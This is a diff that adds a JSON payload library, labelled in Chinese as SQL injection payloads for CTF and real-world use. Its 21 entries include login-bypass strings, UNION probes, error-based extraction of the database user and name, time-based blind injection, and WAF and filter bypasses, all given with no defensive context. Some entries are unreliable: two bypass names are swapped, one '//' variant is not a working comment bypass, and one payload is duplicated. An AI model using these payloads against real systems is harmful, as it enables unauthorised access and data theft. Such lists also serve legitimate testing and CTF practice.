@@ -1,0 +1,133 @@
+{
+    "name": "SQL注入payload库(完整版)",
+    "description": "CTF&实战常用SQL注入payload",
+    "version": "2.0",
+    "payloads": [
+        {
+            "name": "单引号测试",
+            "payload": "'",
+            "type": "sql",
+            "description": "基础单引号测试"
+        },
+        {
+            "name": "双引号测试",
+            "payload": "\"",
+            "type": "sql",
+            "description": "基础双引号测试"
+        },
+        {
+            "name": "单引号闭合+注释",
+            "payload": "'-- ",
+            "type": "sql",
+            "description": "闭合+注释"
+        },
+        {
+            "name": "单引号+#注释",
+            "payload": "'#",
+            "type": "sql",
+            "description": "MYSQL #注释"
+        },
+        {
+            "name": "单引号+--+空格",
+            "payload": "'-- ",
+            "type": "sql",
+            "description": "标准注释"
+        },
+        {
+            "name": "布尔真",
+            "payload": "'OR'1'='1",
+            "type": "sql",
+            "description": "布尔真"
+        },
+        {
+            "name": "布尔假",
+            "payload": "'OR'1'='2",
+            "type": "sql",
+            "description": "布尔假"
+        },
+        {
+            "name": "万能密码1",
+            "payload": "' OR 1=1-- ",
+            "type": "sql",
+            "description": "经典万能密码"
+        },
+        {
+            "name": "万能密码2",
+            "payload": "admin'-- ",
+            "type": "sql",
+            "description": "管理员账户绕过"
+        },
+        {
+            "name": "UNION 3列",
+            "payload": "' UNION SELECT 1,2,3-- ",
+            "type": "sql",
+            "description": "UNION查询"
+        },
+        {
+            "name": "UNION 4列",
+            "payload": "' UNION SELECT 1,2,3,4-- ",
+            "type": "sql",
+            "description": "UNION查询"
+        },
+        {
+            "name": "UNION 5列",
+            "payload": "' UNION SELECT 1,2,3,4,5-- ",
+            "type": "sql",
+            "description": "UNION查询"
+        },
+        {
+            "name": "报错注入updatexml",
+            "payload": "' AND updatexml(1,concat(0x7e,user()),1)-- ",
+            "type": "sql",
+            "description": "报错注入"
+        },
+        {
+            "name": "报错注入extractvalue",
+            "payload": "' AND extractvalue(1,concat(0x7e,database()))-- ",
+            "type": "sql",
+            "description": "报错注入"
+        },
+        {
+            "name": "时间盲注sleep",
+            "payload": "' AND sleep(5)-- ",
+            "type": "sql",
+            "description": "时间盲注"
+        },
+        {
+            "name": "时间盲注benchmark",
+            "payload": "' AND benchmark(10000000,md5(1))-- ",
+            "type": "sql",
+            "description": "时间盲注"
+        },
+        {
+            "name": "绕过空格 //",
+            "payload": "'/**/OR/**/1/**/=/**/1-- ",
+            "type": "sql",
+            "description": "绕过空格过滤"
+        },
+        {
+            "name": "绕过空格 /**/",
+            "payload": "'//OR//1//=//1-- ",
+            "type": "sql",
+            "description": "绕过空格过滤"
+        },
+        {
+            "name": "宽字节注入",
+            "payload": "%df' OR 1=1-- ",
+            "type": "sql",
+            "description": "宽字节注入"
+        },
+        {
+            "name": "WAF绕过1",
+            "payload": "'/*!OR*/1=1-- ",
+            "type": "sql",
+            "description": "MYSQL注释绕过"
+        },
+        {
+            "name": "WAF绕过2",
+            "payload": "'%09OR%091=1-- ",
+            "type": "sql",
+            "description": "TAB绕过"
+        }
+    ]
+}
